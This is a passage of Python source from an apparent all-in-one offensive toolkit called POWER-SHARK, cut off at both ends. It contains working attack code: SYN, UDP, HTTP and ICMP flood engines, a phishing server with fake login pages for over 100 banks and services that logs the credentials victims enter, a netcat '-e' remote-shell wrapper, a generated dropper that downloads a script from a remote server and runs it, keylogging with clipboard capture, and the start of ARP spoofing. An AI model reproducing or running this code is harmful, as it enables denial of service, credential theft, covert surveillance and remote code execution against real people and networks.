    def stop(self, generator_id: str = None) -> bool:
        if generator_id:
            if generator_id in self.stop_events:
                self.stop_events[generator_id].set()
                return True
        else:
            for event in self.stop_events.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': g.id, 'traffic_type': g.traffic_type, 'target_ip': g.target_ip,
                'duration': g.duration, 'packets_sent': g.packets_sent, 'status': g.status
            }
            for g in self.active_generators.values()
        ]

# =====================
# NIKTO SCANNER
# =====================
class NiktoScanner:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.available = shutil.which('nikto') is not None
    
    def scan(self, target: str, options: Dict = None) -> Dict:
        start_time = time.time()
        options = options or {}
        if not self.available:
            return {'success': False, 'error': 'Nikto not installed'}
        try:
            timestamp = int(time.time())
            output_file = os.path.join(NIKTO_RESULTS_DIR, f"nikto_{target.replace('/', '_')}_{timestamp}.json")
            cmd = ['nikto', '-host', target, '-Format', 'json', '-o', output_file]
            if options.get('ssl'):
                cmd.append('-ssl')
            if options.get('port'):
                cmd.extend(['-port', str(options['port'])])
            if options.get('tuning'):
                cmd.extend(['-tuning', options['tuning']])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            scan_time = time.time() - start_time
            vulnerabilities = []
            if os.path.exists(output_file):
                try:
                    with open(output_file, 'r') as f:
                        data = json.load(f)
                        if isinstance(data, dict) and 'vulnerabilities' in data:
                            vulnerabilities = data['vulnerabilities']
                except:
                    pass
            return {
                'success': result.returncode == 0,
                'target': target,
                'vulnerabilities': vulnerabilities,
                'scan_time': scan_time,
                'output_file': output_file
            }
        except subprocess.TimeoutExpired:
            return {'success': False, 'error': 'Scan timed out'}
        except Exception as e:
            return {'success': False, 'error': str(e)}

# =====================
# DOS ATTACK ENGINE
# =====================
class DOSEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running_attacks: Dict[str, threading.Event] = {}
    
    def syn_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("syn", target_ip, port, duration, threads)
    
    def udp_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("udp", target_ip, port, duration, threads)
    
    def http_flood(self, target_ip: str, port: int, duration: int, threads: int = 50) -> Dict:
        return self._attack("http", target_ip, port, duration, threads)
    
    def icmp_flood(self, target_ip: str, duration: int, threads: int = 50) -> Dict:
        return self._attack("icmp", target_ip, 0, duration, threads)
    
    def _attack(self, attack_type: str, target_ip: str, port: int, duration: int, threads: int) -> Dict:
        max_threads = self.config.get('dos.max_threads', 100)
        if threads > max_threads:
            return {'success': False, 'error': f'Threads exceed maximum ({max_threads})'}
        try:
            ipaddress.ip_address(target_ip)
        except:
            return {'success': False, 'error': f'Invalid IP: {target_ip}'}
        attack_id = f"{attack_type}_{target_ip}_{int(time.time())}"
        stop_event = threading.Event()
        self.running_attacks[attack_id] = stop_event
        packets_sent = [0]
        
        def attack_thread():
            end_time = time.time() + duration
            func = self._get_attack_func(attack_type)
            while time.time() < end_time and not stop_event.is_set():
                try:
                    size = func(target_ip, port)
                    if size > 0:
                        packets_sent[0] += 1
                except:
                    pass
        
        attack_threads = []
        for _ in range(threads):
            t = threading.Thread(target=attack_thread, daemon=True)
            t.start()
            attack_threads.append(t)
        
        def monitor():
            for t in attack_threads:
                t.join(timeout=duration + 2)
            self.db.log_dos_attack(attack_type, target_ip, port, duration, packets_sent[0], 'completed')
            if attack_id in self.running_attacks:
                del self.running_attacks[attack_id]
        
        threading.Thread(target=monitor, daemon=True).start()
        return {
            'success': True, 'attack_id': attack_id, 'type': attack_type,
            'target': target_ip, 'port': port, 'duration': duration, 'threads': threads,
            'message': f"{attack_type.upper()} flood started on {target_ip}:{port} for {duration}s"
        }
    
    def _get_attack_func(self, attack_type: str):
        funcs = {'syn': self._send_syn, 'udp': self._send_udp, 'http': self._send_http, 'icmp': self._send_icmp}
        return funcs.get(attack_type, self._send_udp)
    
    def _send_syn(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/TCP(dport=port, flags="S")
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def _send_udp(self, target: str, port: int) -> int:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            data = b"X" * 1024
            sock.sendto(data, (target, port))
            sock.close()
            return len(data) + 8
        except:
            return 0
    
    def _send_http(self, target: str, port: int) -> int:
        try:
            conn = http.client.HTTPConnection(target, port, timeout=1)
            conn.request("GET", "/", headers={"User-Agent": "POWER-SHARK"})
            response = conn.getresponse()
            data = response.read()
            conn.close()
            return len(data) + 100
        except:
            return 0
    
    def _send_icmp(self, target: str, port: int) -> int:
        try:
            if SCAPY_AVAILABLE:
                packet = IP(dst=target)/ICMP()
                send(packet, verbose=False)
                return len(packet)
            return 0
        except:
            return 0
    
    def stop(self, attack_id: str = None) -> bool:
        if attack_id:
            if attack_id in self.running_attacks:
                self.running_attacks[attack_id].set()
                return True
        else:
            for event in self.running_attacks.values():
                event.set()
            return True
        return False
    
    def get_active(self) -> List[Dict]:
        return [
            {
                'id': attack_id,
                'type': attack_id.split('_')[0] if '_' in attack_id else 'unknown',
                'target': attack_id.split('_')[1] if '_' in attack_id else 'unknown'
            }
            for attack_id in self.running_attacks.keys()
        ]

# =====================
# AGENT ENGINE
# =====================
class AgentEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.heartbeat_timer = None
        self.agents = {}
    
    def register_agent(self, name: str, ip_address: str) -> Dict:
        agent_id = str(uuid.uuid4())[:8]
        self.agents[agent_id] = {
            'id': agent_id, 'name': name, 'ip_address': ip_address,
            'status': 'online', 'created_at': datetime.datetime.now().isoformat()
        }
        return {
            'success': True, 'agent_id': agent_id, 'name': name,
            'ip_address': ip_address, 'message': f'Agent {name} registered'
        }
    
    def send_command(self, agent_id: str, command: str) -> bool:
        if agent_id in self.agents:
            return True
        return False
    
    def poll_commands(self, agent_id: str) -> List[Dict]:
        return []
    
    def start_heartbeat(self):
        def heartbeat():
            if self.heartbeat_timer:
                self.heartbeat_timer.cancel()
            interval = self.config.get('agent.heartbeat_interval', 30)
            self.heartbeat_timer = threading.Timer(interval, heartbeat)
            self.heartbeat_timer.daemon = True
            self.heartbeat_timer.start()
        heartbeat()
    
    def stop_heartbeat(self):
        if self.heartbeat_timer:
            self.heartbeat_timer.cancel()
            self.heartbeat_timer = None
    
    def get_agents(self) -> List[Dict]:
        return list(self.agents.values())
    
    def get_agent(self, agent_id: str) -> Optional[Dict]:
        return self.agents.get(agent_id)

# =====================
# NETWORK MONITOR
# =====================
class NetworkMonitor:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.packet_count = 0
        self.interface = config.get('network_monitor.interface', 'eth0')
        self.packets = []
    
    def start(self):
        self.running = True
        threading.Thread(target=self._monitor_loop, daemon=True).start()
        print(f"{Colors.SUCCESS}✅ Network monitor started{Colors.RESET}")
    
    def stop(self):
        self.running = False
    
    def _monitor_loop(self):
        while self.running:
            try:
                if SCAPY_AVAILABLE:
                    sniff(iface=self.interface, prn=self._process_packet, store=0, timeout=5)
                else:
                    time.sleep(1)
            except Exception as e:
                logger.error(f"Network monitor error: {e}")
                time.sleep(5)
    
    def _process_packet(self, packet):
        self.packet_count += 1
        try:
            if SCAPY_AVAILABLE and hasattr(packet, 'haslayer'):
                if packet.haslayer(IP):
                    ip = packet[IP]
                    self.packets.append({
                        'source_ip': ip.src,
                        'dest_ip': ip.dst,
                        'protocol': str(ip.proto),
                        'size': len(packet),
                        'timestamp': datetime.datetime.now().isoformat()
                    })
                    if len(self.packets) > 1000:
                        self.packets = self.packets[-1000:]
        except:
            pass
    
    def get_packets(self, limit: int = 100) -> List[Dict]:
        return self.packets[-limit:]
    
    def get_statistics(self) -> Dict:
        stats = {
            'total_packets': len(self.packets),
            'protocols': Counter(),
            'top_sources': Counter()
        }
        for p in self.packets:
            stats['protocols'][p.get('protocol', 'unknown')] += 1
            stats['top_sources'][p.get('source_ip', 'unknown')] += 1
        return stats

# =====================
# PHISHING SERVER
# =====================
class PhishingRequestHandler(BaseHTTPRequestHandler):
    server_instance = None
    
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        if self.server_instance and self.server_instance.html_content:
            self.wfile.write(self.server_instance.html_content.encode())
    
    def do_POST(self):
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode()
        form_data = urllib.parse.parse_qs(post_data)
        username = form_data.get('email', form_data.get('username', ['']))[0]
        password = form_data.get('password', [''])[0]
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        if self.server_instance and self.server_instance.db and username and password:
            self.server_instance.db.save_captured_credential(
                self.server_instance.link_id, username, password, client_ip, user_agent
            )
            print(f"\n{Colors.ERROR}🎣 CREDENTIALS CAPTURED!{Colors.RESET}")
            print(f"  IP: {client_ip}")
            print(f"  Username: {username}")
            print(f"  Password: {password}")
        self.send_response(302)
        self.send_header('Location', 'https://www.google.com')
        self.end_headers()

class PhishingServer:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.server = None
        self.running = False
        self.link_id = None
        self.html_content = None
    
    def start(self, link_id: str, platform: str, html_content: str, port: int = 8080) -> bool:
        try:
            self.link_id = link_id
            self.html_content = html_content
            handler = PhishingRequestHandler
            handler.server_instance = self
            self.server = socketserver.TCPServer(("0.0.0.0", port), handler)
            thread = threading.Thread(target=self.server.serve_forever, daemon=True)
            thread.start()
            self.running = True
            return True
        except:
            return False
    
    def stop(self):
        if self.server:
            self.server.shutdown()
            self.server.server_close()
            self.running = False
    
    def get_url(self) -> str:
        return f"http://{self._get_local_ip()}:8080"
    
    def _get_local_ip(self) -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"

# =====================
# SOCIAL ENGINEERING (100+ Templates)
# =====================
class SocialEngineeringTools:
    def __init__(self, db: DatabaseManager):
        self.db = db
        self.phishing_server = PhishingServer(db)
        self.active_links = {}
        self.templates = self._load_templates()
    
    def _load_templates(self) -> Dict:
        platforms = [
            'facebook', 'instagram', 'twitter', 'linkedin', 'tiktok', 'snapchat',
            'reddit', 'pinterest', 'tumblr', 'flickr', 'vk', 'weibo',
            'telegram', 'whatsapp', 'discord', 'slack', 'mastodon', 'threads',
            'gmail', 'yahoo', 'outlook', 'hotmail', 'aol', 'protonmail',
            'zoho', 'icloud', 'gmx', 'yandex', 'fastmail', 'tutanota',
            'dropbox', 'google_drive', 'onedrive', 'box', 'mega', 'pcloud',
            'paypal', 'venmo', 'cashapp', 'zelle', 'chase', 'wells_fargo',
            'bank_of_america', 'citibank', 'capital_one', 'discover',
            'american_express', 'barclays', 'hsbc', 'santander', 'revolut',
            'steam', 'epic_games', 'roblox', 'minecraft', 'xbox', 'playstation',
            'nintendo', 'twitch', 'riot_games', 'blizzard', 'ea_games', 'ubisoft',
            'netflix', 'hulu', 'disney_plus', 'hbo_max', 'amazon_prime',
            'spotify', 'apple_music', 'youtube_premium', 'peacock', 'paramount_plus',
            'microsoft', 'google', 'apple', 'adobe', 'zoom', 'teams', 'webex',
            'asana', 'trello', 'notion', 'evernote', 'todoist', 'monday', 'clickup',
            'amazon', 'ebay', 'walmart', 'target', 'best_buy', 'costco',
            'alibaba', 'aliexpress', 'etsy', 'shopify',
            'github', 'gitlab', 'bitbucket', 'jira', 'confluence',
            'shopify_admin', 'wordpress', 'squarespace', 'wix',
            'chase_bank', 'capital_one_bank', 'usaa', 'navy_federal',
            'fedex', 'ups', 'usps', 'dhl', 'royal_mail',
            'att', 'verizon', 't_mobile', 'sprint', 'vodafone',
            'comcast', 'xfinity', 'spectrum', 'cox', 'centurylink',
            'custom'
        ]
        templates = {}
        for p in platforms:
            templates[p] = self._get_template(p)
        return templates
    
    def _get_template(self, platform: str) -> str:
        display_name = platform.replace('_', ' ').title()
        return f"""<!DOCTYPE html>
<html><head><title>{display_name}</title>
<style>
body{{font-family:'Courier New',monospace;background:#000;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}}
.login-box{{background:#000;border:2px solid #fff;padding:40px;width:420px;box-shadow:0 0 30px rgba(255,255,255,0.3)}}
.logo{{color:#fff;font-size:28px;text-align:center;margin-bottom:30px;letter-spacing:4px}}
input{{width:100%;padding:14px;margin:10px 0;background:#000;border:2px solid #fff;box-sizing:border-box;color:#fff;font-family:'Courier New',monospace}}
input:focus{{outline:none;border-color:#fff;box-shadow:0 0 15px rgba(255,255,255,0.5)}}
button{{width:100%;padding:14px;background:#fff;color:#000;border:none;font-size:18px;cursor:pointer;font-weight:bold;font-family:'Courier New',monospace;letter-spacing:2px}}
button:hover{{background:#000;color:#fff;border:2px solid #fff}}
.warning{{margin-top:20px;padding:10px;background:rgba(255,0,0,0.2);color:#ff6b6b;text-align:center;font-size:12px;border:1px solid #ff6b6b}}
</style>
</head>
<body>
<div class="login-box"><div class="logo">[ {display_name} ]</div>
<form method="POST"><input type="text" name="email" placeholder="Email or phone" required>
<input type="password" name="password" placeholder="Password" required>
<button type="submit">LOGIN</button></form>
<div class="warning">⚠️ Security test page - Do not enter real credentials</div>
</div>
</body>
</html>"""
    
    def generate_phishing_link(self, platform: str) -> Dict:
        link_id = str(uuid.uuid4())[:8]
        html = self.templates.get(platform, self.templates['custom'])
        link = PhishingLink(
            id=link_id, platform=platform, phishing_url="http://localhost:8080",
            template=platform, created_at=datetime.datetime.now().isoformat()
        )
        self.db.save_phishing_link(link)
        self.active_links[link_id] = {'platform': platform, 'html': html}
        return {'success': True, 'link_id': link_id, 'platform': platform}
    
    def start_server(self, link_id: str, port: int = 8080) -> bool:
        if link_id not in self.active_links:
            return False
        link_data = self.active_links[link_id]
        return self.phishing_server.start(link_id, link_data['platform'], link_data['html'], port)
    
    def stop_server(self):
        self.phishing_server.stop()
    
    def get_captured_credentials(self, link_id: str = None) -> List[Dict]:
        return self.db.get_captured_credentials(link_id)

# =====================
# NETWORK TOOLS
# =====================
class NetworkTools:
    @staticmethod
    def ping(target: str, count: int = 4) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['ping', '-n', str(count), target]
            else:
                cmd = ['ping', '-c', str(count), target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def nmap(target: str, scan_type: str = "quick") -> CommandResult:
        start_time = time.time()
        try:
            if not shutil.which('nmap'):
                return CommandResult(False, "nmap not installed", 0, "nmap not found")
            scan_map = {
                "quick": ['nmap', '-T4', '-F', target],
                "full": ['nmap', '-p-', target],
                "service": ['nmap', '-sV', target],
                "os": ['nmap', '-O', target],
                "vulnerability": ['nmap', '--script', 'vuln', target],
                "stealth": ['nmap', '-sS', '-T2', target],
                "udp": ['nmap', '-sU', target],
                "ping": ['nmap', '-sn', target]
            }
            cmd = scan_map.get(scan_type, ['nmap', target])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=300)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def wget(url: str, output: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if not shutil.which('wget'):
                return CommandResult(False, "wget not installed", 0, "wget not found")
            cmd = ['wget', '-q', url]
            if output:
                cmd.extend(['-O', output])
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def curl(url: str, method: str = "GET", data: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if not shutil.which('curl'):
                return CommandResult(False, "curl not installed", 0, "curl not found")
            if method.upper() == "GET":
                cmd = ['curl', '-s', url]
            elif method.upper() == "POST":
                cmd = ['curl', '-s', '-X', 'POST', '-d', data or '', url]
            else:
                cmd = ['curl', '-s', '-X', method, url]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def netcat(host: str, port: int, command: str = None) -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('nc'):
                if command:
                    cmd = ['nc', host, str(port), '-e', command]
                else:
                    cmd = ['nc', '-zv', host, str(port)]
            elif shutil.which('ncat'):
                if command:
                    cmd = ['ncat', host, str(port), '-e', command]
                else:
                    cmd = ['ncat', '-zv', host, str(port)]
            else:
                return CommandResult(False, "Netcat not found", 0, "nc/ncat not installed")
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def traceroute(target: str) -> CommandResult:
        start_time = time.time()
        try:
            if platform.system().lower() == 'windows':
                cmd = ['tracert', '-d', target]
            elif shutil.which('mtr'):
                cmd = ['mtr', '--report', '--report-cycles', '1', target]
            else:
                cmd = ['traceroute', '-n', target]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=60)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def whois_lookup(domain: str) -> CommandResult:
        start_time = time.time()
        try:
            if WHOIS_AVAILABLE:
                result = whois.whois(domain)
                return CommandResult(True, str(result), time.time() - start_time)
            else:
                result = subprocess.run(['whois', domain], capture_output=True, text=True, timeout=30)
                return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def dns_query(domain: str, record_type: str = "A") -> CommandResult:
        start_time = time.time()
        try:
            if shutil.which('dig'):
                cmd = ['dig', domain, record_type, '+short']
            else:
                cmd = ['nslookup', domain]
            result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
            return CommandResult(result.returncode == 0, result.stdout + result.stderr, time.time() - start_time)
        except Exception as e:
            return CommandResult(False, str(e), time.time() - start_time, str(e))
    
    @staticmethod
    def location(ip: str) -> Dict:
        try:
            response = requests.get(f"http://ip-api.com/json/{ip}", timeout=10)
            if response.status_code == 200:
                data = response.json()
                if data.get('status') == 'success':
                    return {
                        'success': True, 'country': data.get('country'),
                        'city': data.get('city'), 'isp': data.get('isp')
                    }
            return {'success': False}
        except:
            return {'success': False}
    
    @staticmethod
    def get_local_ip() -> str:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.connect(("8.8.8.8", 80))
            ip = s.getsockname()[0]
            s.close()
            return ip
        except:
            return "127.0.0.1"
    
    @staticmethod
    def block_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-A', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'add', 'rule',
                               f'name=POWERSHARK_Block_{ip}', 'dir=in', 'action=block',
                               f'remoteip={ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def unblock_ip(ip: str) -> bool:
        try:
            if platform.system().lower() == 'linux' and shutil.which('iptables'):
                subprocess.run(['sudo', 'iptables', '-D', 'INPUT', '-s', ip, '-j', 'DROP'],
                             capture_output=True, timeout=10)
                return True
            elif platform.system().lower() == 'windows' and shutil.which('netsh'):
                subprocess.run(['netsh', 'advfirewall', 'firewall', 'delete', 'rule',
                               f'name=POWERSHARK_Block_{ip}'], capture_output=True, timeout=10)
                return True
            return False
        except:
            return False
    
    @staticmethod
    def ip_to_domain(ip: str) -> Optional[str]:
        try:
            domain = socket.gethostbyaddr(ip)[0]
            if domain:
                return domain
            if DNS_AVAILABLE:
                try:
                    rev_name = dns.reversename.from_address(ip)
                    answers = dns.resolver.resolve(rev_name, "PTR")
                    if answers:
                        return str(answers[0]).rstrip('.')
                except:
                    pass
            return None
        except:
            return None
    
    @staticmethod
    def domain_to_ip(domain: str) -> Optional[str]:
        try:
            ip = socket.gethostbyname(domain)
            if ip:
                return ip
            if DNS_AVAILABLE:
                try:
                    answers = dns.resolver.resolve(domain, "A")
                    if answers:
                        return str(answers[0])
                except:
                    pass
            return None
        except:
            return None
    
    @staticmethod
    def get_mac_vendor(mac: str) -> Optional[str]:
        try:
            mac = mac.upper().replace('-', ':').replace('.', ':')
            response = requests.get(f"https://api.macvendors.com/{mac}", timeout=5)
            if response.status_code == 200:
                return response.text.strip()
        except:
            pass
        return None

# =====================
# DOMAIN HOSTING ENGINE
# =====================
class DomainHostingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def translate_ip_to_domain(self, ip: str) -> Optional[str]:
        try:
            domain = socket.gethostbyaddr(ip)[0]
            if domain:
                return domain
            if DNS_AVAILABLE:
                try:
                    rev_name = dns.reversename.from_address(ip)
                    answers = dns.resolver.resolve(rev_name, "PTR")
                    if answers:
                        return str(answers[0]).rstrip('.')
                except:
                    pass
            return None
        except:
            return None
    
    def translate_domain_to_ip(self, domain: str) -> Optional[str]:
        try:
            ip = socket.gethostbyname(domain)
            if ip:
                return ip
            if DNS_AVAILABLE:
                try:
                    answers = dns.resolver.resolve(domain, "A")
                    if answers:
                        return str(answers[0])
                except:
                    pass
            return None
        except:
            return None
    
    def host_domain(self, ip: str, domain: str, port: int = 8080) -> DomainHost:
        try:
            ipaddress.ip_address(ip)
            host_id = str(uuid.uuid4())[:8]
            hosting_path = os.path.join(DOMAIN_HOSTING_DIR, host_id)
            os.makedirs(hosting_path, exist_ok=True)
            domain_host = DomainHost(
                id=host_id, ip=ip, domain=domain, hosting_path=hosting_path,
                created_at=datetime.datetime.now().isoformat(), active=True
            )
            self.db.add_domain_host(domain_host)
            return domain_host
        except Exception as e:
            logger.error(f"Domain hosting error: {e}")
            return None
    
    def list_hosted_domains(self) -> List[Dict]:
        return self.db.get_domain_hosts()

# =====================
# DEPLOYMENT ENGINE
# =====================
class DeploymentEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
    
    def create_pdf_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        pdf_content = f"""%PDF-1.4
1 0 obj
<< /Type /Catalog /Pages 2 0 R >>
endobj
2 0 obj
<< /Type /Pages /Kids [3 0 R] /Count 1 >>
endobj
3 0 obj
<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>
endobj
4 0 obj
<< /Length 100 >>
stream
BT /F1 24 Tf 100 700 Td (POWER-SHARK Document) Tj ET
endstream
endobj
xref
0 5
trailer << /Size 5 /Root 1 0 R >>
startxref
0
%%EOF"""
        pdf_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.pdf")
        with open(pdf_path, 'w') as f:
            f.write(pdf_content)
        deployment = Deployment(
            id=deployment_id, name=name, type="pdf", payload=pdf_path,
            target=target, created_at=datetime.datetime.now().isoformat()
        )
        self.db.save_deployment(deployment)
        return deployment
    
    def create_email_payload(self, name: str, target: str, subject: str, body: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        email_content = f"""Subject: {subject}
To: {target}
Content-Type: text/html

<html><body>{body}<br><br><a href="{keylog_url}">Click here</a></body></html>"""
        email_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.eml")
        with open(email_path, 'w') as f:
            f.write(email_content)
        deployment = Deployment(
            id=deployment_id, name=name, type="email", payload=email_path,
            target=target, created_at=datetime.datetime.now().isoformat()
        )
        self.db.save_deployment(deployment)
        return deployment
    
    def create_link_payload(self, name: str, target: str, keylog_url: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        if SHORTENER_AVAILABLE:
            try:
                s = pyshorteners.Shortener()
                keylog_url = s.tinyurl.short(keylog_url)
            except:
                pass
        deployment = Deployment(
            id=deployment_id, name=name, type="link", payload=keylog_url,
            target=target, created_at=datetime.datetime.now().isoformat()
        )
        self.db.save_deployment(deployment)
        return deployment
    
    def create_executable_payload(self, name: str, target: str, keylog_server: str) -> Deployment:
        deployment_id = str(uuid.uuid4())[:8]
        exe_content = f'''#!/usr/bin/env python3
import os, subprocess, requests
response = requests.get("{keylog_server}/download", timeout=30)
if response.status_code == 200:
    temp_path = "/tmp/update.py"
    with open(temp_path, "wb") as f:
        f.write(response.content)
    subprocess.Popen(["python3", temp_path])
'''
        exe_path = os.path.join(DEPLOYMENT_DIR, f"{deployment_id}.py")
        with open(exe_path, 'w') as f:
            f.write(exe_content)
        deployment = Deployment(
            id=deployment_id, name=name, type="executable", payload=exe_path,
            target=target, created_at=datetime.datetime.now().isoformat()
        )
        self.db.save_deployment(deployment)
        return deployment
    
    def get_deployments(self) -> List[Dict]:
        return self.db.get_deployments()
    
    def track_opened(self, deployment_id: str):
        self.db.update_deployment_status(deployment_id, opened=True)
    
    def track_executed(self, deployment_id: str):
        self.db.update_deployment_status(deployment_id, executed=True)

# =====================
# KEYLOGGER ENGINE
# =====================
class KeyloggerEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.running = False
        self.listener = None
        self.text = ""
        self.current_window = ""
        self.upload_timer = None
        self.clipboard_timer = None
        self.last_clipboard = ""
    
    def start(self):
        if not PYNPUT_AVAILABLE:
            print(f"{Colors.ERROR}❌ Pynput not available{Colors.RESET}")
            return False
        if self.running:
            return True
        try:
            self.running = True
            self.text = ""
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
            self.upload_timer = threading.Timer(30, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
            if self.config.get('keylogger.capture_clipboard', True):
                self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
                self.clipboard_timer.daemon = True
                self.clipboard_timer.start()
            print(f"{Colors.SUCCESS}✅ Keylogger started (Press F10 to stop){Colors.RESET}")
            return True
        except Exception as e:
            print(f"{Colors.ERROR}❌ Failed: {e}{Colors.RESET}")
            return False
    
    def stop(self):
        self.running = False
        if self.listener:
            self.listener.stop()
            self.listener = None
        for timer in [self.upload_timer, self.clipboard_timer]:
            if timer:
                try:
                    timer.cancel()
                except:
                    pass
        self._save_keylog()
        print(f"{Colors.SUCCESS}✅ Keylogger stopped{Colors.RESET}")
    
    def on_press(self, key):
        try:
            if key == keyboard.Key.f10:
                self.stop()
                return False
            if key == keyboard.Key.enter:
                self.text += "\n"
            elif key == keyboard.Key.tab:
                self.text += "\t"
            elif key == keyboard.Key.space:
                self.text += " "
            elif key == keyboard.Key.backspace and len(self.text) > 0:
                self.text = self.text[:-1]
            elif hasattr(key, 'char') and key.char is not None:
                self.text += key.char
            if len(self.text) > 10000:
                self._save_keylog()
                self.text = ""
        except Exception as e:
            logger.error(f"Keylogger error: {e}")
    
    def _save_keylog(self):
        if self.text:
            self.db.save_keylog(self.text, self.current_window, "")
            with open(KEYLOG_FILE, 'a') as f:
                f.write(f"\n[{datetime.datetime.now().isoformat()}]\n{self.text}\n")
            self.text = ""
    
    def _monitor_clipboard(self):
        if not self.running:
            return
        try:
            import pyperclip
            current = pyperclip.paste()
            if current and current != self.last_clipboard:
                self.last_clipboard = current
                self.db.save_clipboard(current, "keylogger")
        except:
            pass
        if self.running:
            self.clipboard_timer = threading.Timer(5, self._monitor_clipboard)
            self.clipboard_timer.daemon = True
            self.clipboard_timer.start()
    
    def _upload_keylog(self):
        if self.text:
            self._save_keylog()
        if self.running:
            self.upload_timer = threading.Timer(30, self._upload_keylog)
            self.upload_timer.daemon = True
            self.upload_timer.start()
    
    def get_keylogs(self, limit: int = 100):
        return self.db.get_keylogs(limit)
    
    def get_screenshots(self) -> List[str]:
        return []
    
    def set_telegram_bot(self, bot):
        pass
    
    def set_discord_bot(self, bot):
        pass

# =====================
# ARP SPOOFING ENGINE
# =====================
class ARPSpoofingEngine:
    def __init__(self, db: DatabaseManager, config: ConfigManager):
        self.db = db
        self.config = config
        self.active_spoofs = {}
        self.interface = config.get('arp_spoofing.interface', 'eth0')
        self.enable_ip_forward = config.get('arp_spoofing.enable_ip_forward', True)
        self.stop_events = {}
    
    def start_spoof(self, target_ip: str, gateway_ip: str, interface: str = None) -> ARPSpoofResult:
        if not SCAPY_AVAILABLE:
            return ARPSpoofResult(
                target_ip=target_ip, gateway_ip=gateway_ip,
                interface=interface or self.interface, status="failed",
                packets_sent=0, duration=0.0,
                started_at=datetime.datetime.now().isoformat(),
                ended_at=datetime.datetime.now().isoformat()
            )
        try:
            ipaddress.ip_address(target_ip)
            ipaddress.ip_address(gateway_ip)
        except ValueError:
            return ARPSpoofResult(
                target_ip=target_ip, gateway_ip=gateway_ip,
                interface=interface or self.interface, status="failed",
                packets_sent=0, duration=0.0,
                started_at=datetime.datetime.now().isoformat(),
                ended_at=datetime.datetime.now().isoformat()
            )
        if self.enable_ip_forward:
            self._enable_ip_forward()
        self.db.add_arp_spoof(target_ip, gateway_ip, interface or self.interface)
